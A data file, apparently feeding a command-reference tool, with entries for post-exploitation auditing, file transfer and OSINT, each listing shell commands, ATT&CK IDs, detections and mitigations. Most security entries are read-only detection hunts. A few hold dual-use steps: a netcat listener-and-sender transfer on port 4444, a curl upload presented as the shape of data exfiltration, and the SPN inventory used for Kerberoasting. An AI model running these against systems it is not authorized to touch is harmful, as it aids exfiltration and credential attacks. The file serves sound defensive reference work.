 {"id":"post-kerberoasting","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"Kerberoasting (catalog + detect)","desc":"Concept: request service tickets for SPN accounts and crack them offline for the service password. Below inventories kerberoastable accounts. Get-ADUser needs RSAT.","danger":"No cracking workflow provided. Authorized AD assessments only.","team":"purple","tags":["active-directory","password","detection"],"attack":["T1558.003"],"detect":"Security 4769 TGS requests with encryption type 0x17 (RC4) and/or high service-ticket volume from a single account.","mitigate":"Use gMSA or long random service passwords; enforce AES and disable RC4; alert on RC4 TGS bursts.","code":{"ps":"# RSAT ActiveDirectory:\nGet-ADUser -Filter 'ServicePrincipalName -like \"*\"' -Properties ServicePrincipalName |\n  Select-Object SamAccountName, ServicePrincipalName\n# Without RSAT:\nsetspn -Q */*"}},
 {"id":"post-scheduled-task-cron","level":"advanced","updated":"2026-07","related":["post-run-keys","post-service-daemon-persistence"],"cat":"Post-Exploitation","title":"Scheduled task / cron persistence (audit)","desc":"Audit scheduled tasks, cron jobs, and systemd timers where attackers hide persistence.","danger":"Read-only audit. Creating persistence needs privilege — authorized only.","team":"purple","tags":["persistence","scheduling","detection"],"attack":["T1053.005","T1053.003"],"detect":"Windows 4698 (task created); new files in /etc/cron.* or systemd timer units; auditd watches on cron paths.","mitigate":"Restrict task/cron creation to admins; baseline scheduled jobs; alert on new or modified persistence entries.","code":{"ps":"Get-ScheduledTask | Where-Object State -ne 'Disabled' |\n  Select-Object TaskPath, TaskName, State\nschtasks /query /fo LIST /v","cmd":"schtasks /query /fo LIST /v","mac":"crontab -l 2>/dev/null\nls -la /Library/LaunchDaemons ~/Library/LaunchAgents 2>/dev/null","linux":"crontab -l 2>/dev/null\nls -la /etc/cron.d /etc/cron.daily\nsystemctl list-timers --all"}},
 {"id":"post-run-keys","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"Registry Run keys & Startup persistence (audit)","desc":"Audit autostart locations (Run keys, Startup folder) commonly abused for persistence.","danger":"Read-only audit; authorized only.","team":"purple","tags":["persistence","registry","windows"],"attack":["T1547.001"],"detect":"Sysmon 12/13 registry writes to Run/RunOnce keys; Security 4657; new files in Startup folders.","mitigate":"Baseline autoruns (Sysinternals Autoruns); restrict HKLM writes; app allowlisting (WDAC/AppLocker).","code":{"ps":"'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',\n'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' |\n  ForEach-Object { Get-ItemProperty $_ -ErrorAction SilentlyContinue }\nGet-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location","cmd":"reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nreg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\""}},
 {"id":"post-service-daemon-persistence","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"Service / daemon persistence (audit)","desc":"Audit Windows services, launchd agents/daemons, and systemd units for attacker-installed persistence.","danger":"Read-only audit; installing services/daemons needs privilege. Authorized only.","team":"purple","tags":["persistence","detection","cross-platform"],"attack":["T1543.003","T1543.001","T1543.002"],"detect":"Windows 7045 (service installed); new .plist in LaunchDaemons/LaunchAgents; new .service units; binaries in user-writable paths.","mitigate":"Restrict service/daemon creation; monitor unusual binary paths; sign services; baseline enabled units.","code":{"ps":"Get-CimInstance Win32_Service |\n  Where-Object { $_.PathName -notmatch 'C:\\\\Windows|Program Files' } |\n  Select-Object Name, StartMode, State, PathName","mac":"launchctl list\nls -la /Library/LaunchDaemons /Library/LaunchAgents ~/Library/LaunchAgents 2>/dev/null","linux":"systemctl list-unit-files --type=service --state=enabled\nls -la /etc/systemd/system"}},
 {"id":"post-account-persistence","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"Account creation / manipulation persistence (audit)","desc":"Audit for backdoor accounts, unexpected privileged-group additions, and rogue UID-0 users.","danger":"Read-only audit; account/group changes require privilege. Authorized only.","team":"purple","tags":["persistence","account","detection"],"attack":["T1136.001","T1098"],"detect":"Windows 4720 (account created), 4728/4732 (added to privileged group); auditd useradd/usermod; new UID-0 line in /etc/passwd.","mitigate":"Approval workflow for account changes; alert on privileged-group edits; disable unused accounts; least privilege.","code":{"ps":"Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet\nGet-LocalGroupMember Administrators","cmd":"net user\nnet localgroup administrators","mac":"dscl . -list /Users UniqueID | awk '$2<500'\nlast | head","linux":"awk -F: '$3==0{print $1\" UID0\"}' /etc/passwd\ngetent group sudo wheel\nlastlog | grep -v 'Never'"}},
 {"id":"post-ssh-authorized-keys","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"SSH authorized_keys persistence (audit)","desc":"Audit authorized_keys files for attacker-planted public keys — a stealthy Unix backdoor.","danger":"Read-only audit; modifying authorized_keys grants standing access. Authorized only.","team":"purple","tags":["persistence","remote","cross-platform"],"attack":["T1098.004"],"detect":"Creation/modification of authorized_keys, unexpected key entries, or FIM/auditd alerts on ~/.ssh writes.","mitigate":"Centralize key management; file-integrity monitoring on authorized_keys; prefer CA-signed certificates; review keys regularly.","code":{"linux":"for f in /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys; do\n  [ -f \"$f\" ] && echo \"== $f ==\" && cat \"$f\"\ndone\nfind /home /root -name authorized_keys -mtime -7 2>/dev/null -exec ls -l {} \\;","mac":"cat ~/.ssh/authorized_keys 2>/dev/null\nfind /Users -name authorized_keys -mtime -7 2>/dev/null -exec ls -l {} \\;"}},
 {"id":"post-wmi-subscription","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"WMI event subscription persistence (audit)","desc":"Enumerate permanent WMI event filters, consumers, and bindings used for fileless persistence.","danger":"Read-only audit; creating subscriptions needs admin. Authorized only.","team":"purple","tags":["persistence","windows","sysmon"],"attack":["T1546.003"],"detect":"Sysmon 19/20/21 (WMI filter/consumer/binding registered); new CommandLineEventConsumer or ActiveScriptEventConsumer.","mitigate":"Baseline permanent WMI subscriptions; alert on new consumers; restrict WMI namespace writes to admins.","code":{"ps":"Get-CimInstance -Namespace root/subscription -ClassName __EventFilter |\n  Select-Object Name, Query\nGet-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer |\n  Select-Object Name, CommandLineTemplate\nGet-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding"}},
 {"id":"post-remote-services-lateral","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"Remote-service lateral movement (audit logons)","desc":"Review RDP/SMB/WinRM/SSH logons to spot lateral movement between hosts.","danger":"Read-only log review; authorized only.","team":"purple","tags":["remote","detection","logs"],"attack":["T1021.001","T1021.002","T1021.004"],"detect":"Windows 4624 logon type 3/10 from new sources; RDP 4778/4779; SSH 'Accepted' from unusual IPs; new WinRM sessions.","mitigate":"Funnel remote admin through jump hosts; require MFA; segment networks; disable unused remote services.","code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 300 |\n  Where-Object { $_.Message -match 'Logon Type:\\s+(3|10)' } |\n  Format-Table TimeCreated, Id -AutoSize","linux":"last -a | head -20\njournalctl -u ssh -u sshd --since '-24h' 2>/dev/null | grep -Ei 'Accepted|Failed' | tail -20","mac":"last | head -20\nlog show --last 24h --predicate 'process == \"sshd\"' 2>/dev/null | grep -i accepted | tail"}},
 {"id":"post-pass-the-hash-ticket","level":"advanced","updated":"2026-07","related":["post-remote-execution","post-remote-services-lateral"],"cat":"Post-Exploitation","title":"Pass-the-Hash / Pass-the-Ticket (catalog + detect)","desc":"Concept: reuse stolen NTLM hashes or Kerberos tickets to authenticate without the plaintext password. Detection hunt below.","danger":"No attack command provided; requires harvested credential material. Authorized only.","team":"purple","tags":["active-directory","detection","windows"],"attack":["T1550.002","T1550.003"],"detect":"Security 4624 LogonType 9 (NewCredentials/seclogo) with NTLM; NTLM where Kerberos is expected; anomalous ticket lifetimes or mismatched account/host.","mitigate":"Credential Guard; unique local admin passwords (LAPS); tiered admin model; restrict/disable NTLM.","code":{"ps":"# Hunt LogonType 9 (seclogo) NTLM logons — overpass/PtH pattern\nGet-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 500 |\n  Where-Object { $_.Message -match 'Logon Type:\\s+9' -and $_.Message -match 'seclogo' }"}},
 {"id":"post-remote-execution","level":"advanced","requires":{"elevation":true},"updated":"2026-07","related":["post-remote-services-lateral"],"cat":"Post-Exploitation","title":"Remote execution: PsExec / WMI / WinRM (catalog + detect)","desc":"Concept: execute commands on remote hosts via service creation (PsExec), WMI, or WinRM. Detection hunts below.","danger":"No attack command provided; requires admin on the target. Authorized only.","team":"purple","tags":["remote","detection","windows"],"attack":["T1569.002","T1047"],"detect":"Windows 7045 PSEXESVC service install; wmiprvse.exe or wsmprovhost.exe spawning cmd/powershell; named-pipe indicators in 4688.","mitigate":"Restrict admin shares and SMB; disable unused WinRM; monitor service installs; app allowlisting.","code":{"ps":"# PsExec service install:\nGet-WinEvent -FilterHashtable @{LogName='System';Id=7045} -MaxEvents 200 |\n  Where-Object { $_.Message -match 'PSEXESVC|PsExec' }\n# WMI / WinRM exec parents (needs Sysmon EID 1):\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} -MaxEvents 500 |\n  Where-Object { $_.Message -match 'ParentImage:.*(wmiprvse|wsmprovhost)' }"}},
 {"id":"post-clear-logs","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"Indicator removal: log clearing (detect)","desc":"Detect cleared or tampered event/audit logs — a common anti-forensic step after compromise.","danger":"Detection-only. Clearing logs to hide activity is offensive and destructive. Authorized only.","team":"purple","tags":["logs","detection","incident-response"],"attack":["T1070.001","T1070.002"],"detect":"Security 1102 (audit log cleared); System 104 (event log cleared); unexpectedly empty/zeroed logs; journal verification failures; gaps in sequence numbers.","mitigate":"Forward logs off-host to a SIEM/syslog in real time; restrict the 'manage auditing and security log' right; alert on 1102/104.","code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security';Id=1102} -MaxEvents 20\nGet-WinEvent -FilterHashtable @{LogName='System';Id=104} -MaxEvents 20","linux":"ls -la /var/log/auth.log* /var/log/secure* 2>/dev/null\nlast -x | grep -Ei 'reboot|shutdown' | head\njournalctl --verify 2>&1 | tail","mac":"ls -la /var/log/system.log*\nlog show --last 24h --predicate 'eventMessage CONTAINS \"log\"' 2>/dev/null | tail"}},
 {"id":"post-impair-defenses","level":"advanced","requires":{"elevation":true},"updated":"2026-07","cat":"Post-Exploitation","title":"Impair defenses: AV / firewall / logging (audit)","desc":"Verify security controls are still enabled — attackers disable AV, firewalls, and logging before acting.","danger":"Read-only status check; disabling controls needs admin/root and is offensive. Authorized only.","team":"purple","tags":["detection","incident-response","cross-platform"],"attack":["T1562.001"],"detect":"Defender 5001/5010, Set-MpPreference DisableRealtimeMonitoring, new AV exclusions; firewall-disabled events; auditd/rsyslog stopped.","mitigate":"Enable Tamper Protection; alert on AV/firewall/logging config changes; restrict admin; enforce central config management.","code":{"ps":"Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, TamperProtectionSource\nGet-MpPreference | Select-Object -ExpandProperty ExclusionPath\nGet-NetFirewallProfile | Select-Object Name, Enabled","linux":"systemctl is-active auditd rsyslog 2>/dev/null\ncommand -v ufw >/dev/null && sudo ufw status\nsysctl kernel.yama.ptrace_scope","mac":"/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\nspctl --status\ncsrutil status"}},
 {"id":"post-archive-staging","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"Collection staging & archiving (detect)","desc":"Hunt recently created large or password-protected archives staged for exfiltration.","danger":"Read-only hunt; authorized only.","team":"purple","tags":["post-ex","detection","cross-platform"],"attack":["T1560.001","T1074.001"],"detect":"Creation of large or password-protected archives (7z/rar/zip) before exfil; staging in temp/AppData; Sysmon 11 file-create bursts.","mitigate":"DLP; monitor archive utilities on servers; egress filtering; alert on large temp files and rare archive tools.","code":{"ps":"Get-ChildItem $env:TEMP,$env:USERPROFILE -Recurse -Include *.zip,*.7z,*.rar,*.tar,*.gz -ErrorAction SilentlyContinue |\n  Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-2) -and $_.Length -gt 10MB } |\n  Sort-Object Length -Descending | Select-Object FullName, Length, LastWriteTime -First 20","linux":"find {{PATH:/tmp}} /home -type f \\( -name '*.zip' -o -name '*.tar.gz' -o -name '*.7z' -o -name '*.rar' \\) -mtime -2 -size +10M 2>/dev/null -exec ls -lh {} \\;","mac":"find {{PATH:/tmp}} /Users -type f \\( -name '*.zip' -o -name '*.tar.gz' -o -name '*.7z' -o -name '*.rar' \\) -mtime -2 -size +10M 2>/dev/null -exec ls -lh {} \\;"}},
 {"id":"post-exfil-channels","level":"advanced","updated":"2026-07","cat":"Post-Exploitation","title":"Exfiltration & C2 channels (detect)","desc":"Review established outbound connections to spot exfil over C2 or alternate protocols (incl. DNS tunneling).","danger":"Read-only network review; authorized only.","team":"purple","tags":["network","detection","incident-response"],"attack":["T1041","T1048.003","T1071.004"],"detect":"Large sustained outbound to a single external IP; periodic beaconing; long/high-volume DNS TXT queries; connections to new/rare ASNs.","mitigate":"Egress allowlisting; DNS monitoring and sinkholing; proxy inspection; DLP; alert on beaconing periodicity.","code":{"ps":"Get-NetTCPConnection -State Established |\n  Where-Object { $_.RemoteAddress -notmatch '^(127\\.|::1|10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.)' } |\n  Select-Object RemoteAddress, RemotePort, OwningProcess | Sort-Object RemoteAddress","linux":"ss -tunp | grep ESTAB | grep -vE '127\\.0\\.0\\.1|::1'\n# DNS-tunneling hint: watch resolver logs for long/frequent TXT queries","mac":"lsof -nP -iTCP -sTCP:ESTABLISHED | grep -vE '127\\.0\\.0\\.1|::1'"}},

/* ================= FILE TRANSFER & SYNC ================= */
 {"id":"xfer-scp-file","level":"beginner","cat":"File Transfer & Sync","title":"Copy a file over SSH (scp)","desc":"Push a local file to a remote host over SSH; swap the two arguments to pull instead. scp ships by default in the OpenSSH client (Windows 10+, macOS, Linux).","tags":["file-transfer","remote","cross-platform"],"code":{"ps":"scp {{FILE:.\\data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","cmd":"scp {{FILE:data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","mac":"scp {{FILE:./data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","linux":"scp {{FILE:./data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}"}},
 {"id":"xfer-scp-recursive","level":"beginner","cat":"File Transfer & Sync","title":"Copy a directory tree over SSH","desc":"Recursively copy a whole directory to a remote host with scp -r.","tags":["file-transfer","remote","cross-platform"],"code":{"ps":"scp -r {{DIR:.\\project}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","mac":"scp -r {{DIR:./project}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","linux":"scp -r {{DIR:./project}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}"}},
 {"id":"xfer-scp-port-key","level":"beginner","cat":"File Transfer & Sync","title":"scp on a custom port with a key file","desc":"Use -P for a non-default SSH port and -i to select an identity/private key. Note: scp uses -P (uppercase) for port, unlike ssh's -p.","tags":["file-transfer","remote","cross-platform"],"code":{"mac":"scp -P {{PORT:2222}} -i {{KEY:~/.ssh/id_ed25519}} {{FILE:./data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","linux":"scp -P {{PORT:2222}} -i {{KEY:~/.ssh/id_ed25519}} {{FILE:./data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}","ps":"scp -P {{PORT:2222}} -i {{KEY:$HOME\\.ssh\\id_ed25519}} {{FILE:.\\data.txt}} {{USER}}@{{HOST}}:{{DEST:/tmp/}}"}},
 {"id":"xfer-sftp","level":"beginner","cat":"File Transfer & Sync","title":"Fetch a file with sftp","desc":"Non-interactive style one-shot: sftp can take a remote path and local dest to download directly; run bare 'sftp user@host' for an interactive get/put session.","tags":["file-transfer","remote","cross-platform"],"code":{"ps":"sftp {{USER}}@{{HOST}}:{{REMOTE:/path/file.bin}} {{LOCAL:.}}","mac":"sftp {{USER}}@{{HOST}}:{{REMOTE:/path/file.bin}} {{LOCAL:.}}","linux":"sftp {{USER}}@{{HOST}}:{{REMOTE:/path/file.bin}} {{LOCAL:.}}"}},
 {"id":"xfer-rsync-archive","level":"beginner","cat":"File Transfer & Sync","title":"Sync directories locally with rsync","desc":"Archive-mode local sync preserving perms/times, only copying changed files. rsync ships on macOS and most Linux; a trailing slash on SRC copies contents, no slash copies the folder.","tags":["file-transfer","backup","cross-platform"],"code":{"mac":"rsync -avh --progress {{SRC:./src/}} {{DST:./backup/}}","linux":"rsync -avh --progress {{SRC:./src/}} {{DST:./backup/}}"}},
 {"id":"xfer-rsync-ssh","level":"beginner","cat":"File Transfer & Sync","title":"rsync over SSH (compressed)","desc":"Sync a local tree to a remote host over SSH with compression; efficient for repeat transfers because only deltas move.","tags":["file-transfer","remote","backup"],"code":{"mac":"rsync -avz -e ssh {{SRC:./src/}} {{USER}}@{{HOST}}:{{DEST:/backup/}}","linux":"rsync -avz -e ssh {{SRC:./src/}} {{USER}}@{{HOST}}:{{DEST:/backup/}}"}},
 {"id":"xfer-rsync-mirror","level":"beginner","cat":"File Transfer & Sync","title":"Mirror a directory with rsync --delete","desc":"Make DST an exact mirror of SRC; --delete removes files in DST that no longer exist in SRC.","danger":"--delete permanently removes files from the destination that are not in the source. Dry-run first with -n (--dry-run) before committing.","tags":["file-transfer","backup","quick-win"],"code":{"mac":"rsync -av --delete {{SRC:./src/}} {{DST:./mirror/}}","linux":"rsync -av --delete {{SRC:./src/}} {{DST:./mirror/}}"}},
 {"id":"xfer-robocopy-copy","level":"beginner","cat":"File Transfer & Sync","title":"Copy a tree with robocopy","desc":"Windows-native robust copy including subdirectories, with restartable mode and retry limits. /E copies all subfolders including empty ones.","tags":["file-transfer","backup","windows"],"code":{"ps":"robocopy {{SRC:C:\\data}} {{DST:D:\\backup}} /E /Z /R:3 /W:5","cmd":"robocopy {{SRC:C:\\data}} {{DST:D:\\backup}} /E /Z /R:3 /W:5"}},
 {"id":"xfer-robocopy-mirror","level":"beginner","cat":"File Transfer & Sync","title":"Mirror a tree with robocopy /MIR","desc":"Mirror source to destination so the two match exactly. /MIR combines /E with purge of extra destination files.","danger":"/MIR deletes files and folders in the destination that are absent from the source. Test with /L (list-only) first. Requires write access to the destination.","tags":["file-transfer","backup","windows"],"code":{"ps":"robocopy {{SRC:C:\\data}} {{DST:D:\\mirror}} /MIR /Z /R:3 /W:5","cmd":"robocopy {{SRC:C:\\data}} {{DST:D:\\mirror}} /MIR /Z /R:3 /W:5"}},
 {"id":"xfer-curl-download","level":"beginner","cat":"File Transfer & Sync","title":"Download a file with curl","desc":"Fetch a URL to disk, following redirects (-L), keeping the remote filename (-O). curl.exe ships on Windows 10+, macOS, and Linux; use curl.exe in PowerShell since 'curl' is aliased to Invoke-WebRequest there.","tags":["file-transfer","web","cross-platform"],"code":{"ps":"curl.exe -L -O {{URL:https://example.com/file.bin}}","cmd":"curl -L -O {{URL:https://example.com/file.bin}}","mac":"curl -L -O {{URL:https://example.com/file.bin}}","linux":"curl -L -O {{URL:https://example.com/file.bin}}"}},
 {"id":"xfer-curl-resume","level":"beginner","cat":"File Transfer & Sync","title":"Resume an interrupted download","desc":"Continue a partially downloaded file where it left off with curl -C - (auto-detect offset).","tags":["file-transfer","web","cross-platform"],"code":{"ps":"curl.exe -L -C - -O {{URL:https://example.com/big.iso}}","cmd":"curl -L -C - -O {{URL:https://example.com/big.iso}}","mac":"curl -L -C - -O {{URL:https://example.com/big.iso}}","linux":"curl -L -C - -O {{URL:https://example.com/big.iso}}"}},
 {"id":"xfer-wget-download","level":"beginner","cat":"File Transfer & Sync","title":"Download a file with GNU wget","desc":"Fetch a URL to disk with GNU wget (default on most Linux distros; not installed by default on macOS or Windows). -c resumes if re-run.","tags":["file-transfer","web","linux"],"code":{"linux":"wget -c {{URL:https://example.com/file.bin}}"}},
 {"id":"xfer-wget-mirror","level":"beginner","cat":"File Transfer & Sync","title":"Mirror a website with wget","desc":"Recursively download a site for offline use with GNU wget: -m mirror, -p page requisites, -k convert links. Respect robots and scope; can pull large volumes.","danger":"Recursive mirroring can generate heavy traffic and may fetch far more than intended. Scope with --domains and only mirror sites you are authorized to.","tags":["file-transfer","web","linux"],"code":{"linux":"wget -m -p -k --domains={{DOMAIN:example.com}} {{URL:https://example.com/}}"}},
 {"id":"xfer-invoke-webrequest","level":"beginner","cat":"File Transfer & Sync","title":"Download with Invoke-WebRequest","desc":"PowerShell-native HTTP download saving the body to a file with -OutFile.","tags":["file-transfer","web","windows"],"code":{"ps":"Invoke-WebRequest -Uri {{URL:https://example.com/file.bin}} -OutFile {{OUT:C:\\Temp\\file.bin}}"}},
 {"id":"xfer-bits","level":"beginner","cat":"File Transfer & Sync","title":"Background download with BITS","desc":"Use the Background Intelligent Transfer Service (BITS) for throttled, resumable, network-aware downloads via the built-in BitsTransfer module.","tags":["file-transfer","web","windows"],"code":{"ps":"Start-BitsTransfer -Source {{URL:https://example.com/file.bin}} -Destination {{OUT:C:\\Temp\\file.bin}}"}},
 {"id":"xfer-python-httpserver","level":"beginner","cat":"File Transfer & Sync","title":"Serve a folder over HTTP (Python)","desc":"Quickly expose the current directory over HTTP for ad-hoc transfers using Python's stdlib http.server. On Windows use 'python' instead of 'python3'.","danger":"Serves every file in the current directory to anyone who can reach the port. Bind to 127.0.0.1 (as shown) unless you intend LAN access, and stop it when done.","tags":["file-transfer","network","quick-win"],"code":{"py":"python3 -m http.server {{PORT:8000}} --bind 127.0.0.1"}},
 {"id":"xfer-tar-ssh","level":"beginner","cat":"File Transfer & Sync","title":"Stream a directory over SSH with tar","desc":"Pipe a gzipped tar stream through SSH to copy a directory without a temp archive on disk; useful when rsync is unavailable.","tags":["file-transfer","remote","backup"],"code":{"mac":"tar czf - {{DIR:mydir}} | ssh {{USER}}@{{HOST}} 'tar xzf - -C {{DEST:/tmp}}'","linux":"tar czf - {{DIR:mydir}} | ssh {{USER}}@{{HOST}} 'tar xzf - -C {{DEST:/tmp}}'"}},
 {"id":"xfer-checksum-generate","level":"beginner","cat":"File Transfer & Sync","title":"Generate a SHA-256 checksum","desc":"Compute a SHA-256 digest of a file to record before/after a transfer. macOS uses shasum -a 256 (BSD); Linux uses sha256sum (GNU coreutils); Windows uses Get-FileHash or certutil.","tags":["file-transfer","forensics","reference"],"code":{"ps":"Get-FileHash {{FILE:file.iso}} -Algorithm SHA256 | Format-List","cmd":"certutil -hashfile {{FILE:file.iso}} SHA256","mac":"shasum -a 256 {{FILE:file.iso}}","linux":"sha256sum {{FILE:file.iso}}"}},
 {"id":"xfer-checksum-verify","level":"beginner","cat":"File Transfer & Sync","title":"Verify a file against an expected hash","desc":"Confirm a downloaded file matches a published SHA-256. GNU/BSD tools verify from a 'hash  filename' line; PowerShell compares the .Hash property to an expected string.","tags":["file-transfer","forensics","detection"],"code":{"ps":"(Get-FileHash {{FILE:file.iso}} -Algorithm SHA256).Hash -eq '{{EXPECTED:ABCD...}}'","cmd":"certutil -hashfile {{FILE:file.iso}} SHA256","mac":"echo \"{{EXPECTED:ABCD...}}  {{FILE:file.iso}}\" | shasum -a 256 -c -","linux":"echo \"{{EXPECTED:ABCD...}}  {{FILE:file.iso}}\" | sha256sum -c -"}},
 {"id":"xfer-nc-transfer","level":"beginner","updated":"2026-07","cat":"File Transfer & Sync","title":"Transfer a file with netcat","desc":"Move a file over a raw TCP socket: listener writes to disk, sender streams the file. macOS ships the BSD nc (nc -l PORT); Linux traditional netcat uses nc -l -p PORT. Ports and traffic are cleartext.","team":"purple","attack":["T1105"],"detect":"Unexpected listeners on non-standard ports (ss -ltnp on Linux / netstat -ano on Windows), nc/ncat process execution, and IDS signatures on cleartext bulk transfers over odd ports.","mitigate":"Enforce egress/ingress firewall rules limiting outbound ports, application allowlisting to block nc where not needed, and network segmentation.","danger":"Netcat sends data unauthenticated and unencrypted; opening arbitrary listeners is a common exfil/ingress-tool technique. Use only on networks and hosts you are authorized to test.","tags":["file-transfer","network","post-ex"],"code":{"mac":"# receiver:\nnc -l {{PORT:4444}} > {{OUT:file.bin}}\n# sender:\nnc {{HOST}} {{PORT:4444}} < {{FILE:file.bin}}","linux":"# receiver:\nnc -l -p {{PORT:4444}} > {{OUT:file.bin}}\n# sender:\nnc {{HOST}} {{PORT:4444}} < {{FILE:file.bin}}"}},
 {"id":"xfer-curl-upload-exfil","level":"beginner","updated":"2026-07","cat":"File Transfer & Sync","title":"Upload a file to a remote endpoint (curl)","desc":"PUT a local file to an HTTP(S) endpoint with curl -T. Legitimate for API uploads; also the shape of web-based data exfiltration.","team":"purple","attack":["T1048","T1567.002"],"detect":"Proxy/web-gateway logs of large outbound POST/PUT to uncommon or newly-seen domains, DLP alerts on sensitive-file egress, and NetFlow showing asymmetric upload volume.","mitigate":"Egress filtering and allowlisted destinations, TLS inspection at the perimeter, DLP on outbound uploads, and blocking unsanctioned cloud/file-sharing domains.","danger":"Uploading data to third-party endpoints can constitute data exfiltration. Only send data you own to destinations you control, under explicit authorization.","tags":["file-transfer","web","post-ex"],"code":{"ps":"curl.exe -T {{FILE:C:\\data\\report.zip}} {{URL:https://upload.example.com/incoming/}}","mac":"curl -T {{FILE:./report.zip}} {{URL:https://upload.example.com/incoming/}}","linux":"curl -T {{FILE:./report.zip}} {{URL:https://upload.example.com/incoming/}}"}},
 {"id":"xfer-smb-copy","level":"beginner","cat":"File Transfer & Sync","title":"Copy to an SMB/UNC share","desc":"Map or write directly to a Windows file share. On Linux use smbclient (from the samba-client package, not installed by default) to put a file.","danger":"Passing credentials on the command line can expose them in history/process listings. Use interactive prompts where possible and ensure you are authorized to write to the share.","tags":["file-transfer","smb","remote"],"code":{"cmd":"net use \\\\{{HOST}}\\{{SHARE}} /user:{{USER}} & copy {{FILE:data.zip}} \\\\{{HOST}}\\{{SHARE}}\\","ps":"Copy-Item {{FILE:.\\data.zip}} -Destination \\\\{{HOST}}\\{{SHARE}}\\","linux":"smbclient //{{HOST}}/{{SHARE}} -U {{USER}} -c 'put {{FILE:data.zip}}'"}},
 {"id":"xfer-copyitem-session","level":"beginner","cat":"File Transfer & Sync","title":"Copy over a PowerShell remoting session","desc":"Use an established PSSession to copy files to/from a remote Windows host with Copy-Item -ToSession (or -FromSession), traversing WinRM without a file share.","tags":["file-transfer","remote","windows"],"code":{"ps":"$s = New-PSSession -ComputerName {{HOST}}; Copy-Item -Path {{SRC:C:\\file.txt}} -Destination {{DST:C:\\Temp\\}} -ToSession $s; Remove-PSSession $s"}},

/* ================= OSINT ================= */
 {"id":"osint-whois-rdap","level":"intermediate","updated":"2026-07","related":["osint-dns-records","osint-asn-lookup"],"cat":"OSINT","title":"Domain registration via RDAP","desc":"Query structured registration data (registrar, dates, nameservers) over RDAP with curl/Invoke-RestMethod — no extra tools.","danger":"Passive, but only profile domains you are authorized to assess; bulk RDAP queries may breach registry rate limits or ToS.","team":"red","tags":["osint","recon","reference"],"attack":["T1596.002"],"detect":"Invisible to target — RDAP requests hit the registry/registrar, not victim infrastructure; no victim-side telemetry is generated.","mitigate":"Enable registrar/WHOIS privacy proxy, use role-based (not personal) registrant contacts, and monitor for typosquatted lookalike domains.","code":{"ps":"Invoke-RestMethod \"https://rdap.org/domain/{{DOMAIN:example.com}}\" | ConvertTo-Json -Depth 6","mac":"curl -s https://rdap.org/domain/{{DOMAIN:example.com}} | python3 -m json.tool","linux":"curl -s https://rdap.org/domain/{{DOMAIN:example.com}} | python3 -m json.tool","py":"import urllib.request,json; print(json.dumps(json.load(urllib.request.urlopen('https://rdap.org/domain/{{DOMAIN:example.com}}')),indent=2))"}},
 {"id":"osint-whois-cli","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Classic whois lookup","desc":"Legacy free-text registration lookup with the whois client (default on macOS; on Linux install via package manager if absent).","danger":"Passive; scope to authorized targets and respect registry query throttling.","team":"red","tags":["osint","recon","reference"],"attack":["T1596.002"],"detect":"Invisible to target — the query resolves against registry/registrar whois servers, never the victim's hosts.","mitigate":"Use domain privacy, generic abuse/registrant addresses, and avoid leaking staff names or internal email formats in registration records.","code":{"mac":"whois {{DOMAIN:example.com}}","linux":"whois {{DOMAIN:example.com}}"}},
 {"id":"osint-dns-records","level":"intermediate","updated":"2026-07","related":["osint-dns-mx","osint-dns-txt-spf","osint-cert-transparency"],"cat":"OSINT","title":"Enumerate DNS records","desc":"Pull A/AAAA/MX/NS/TXT records for a domain using built-in resolvers (dig, nslookup, Resolve-DnsName).","danger":"Passive when using a public/recursive resolver; only enumerate domains within your authorized scope.","team":"red","tags":["osint","dns","recon","enumeration"],"attack":["T1590.002"],"detect":"Invisible to target — queries are answered from recursive-resolver cache or authoritative NS, producing no application-level telemetry for the victim (some ANY queries return RFC 8482 HINFO).","mitigate":"Publish only necessary records, split internal/external DNS views, and disable wildcard responses that leak infrastructure.","code":{"ps":"Resolve-DnsName {{DOMAIN:example.com}} -Type ANY","cmd":"nslookup -type=any {{DOMAIN:example.com}}","mac":"dig {{DOMAIN:example.com}} ANY +noall +answer","linux":"dig {{DOMAIN:example.com}} ANY +noall +answer"}},
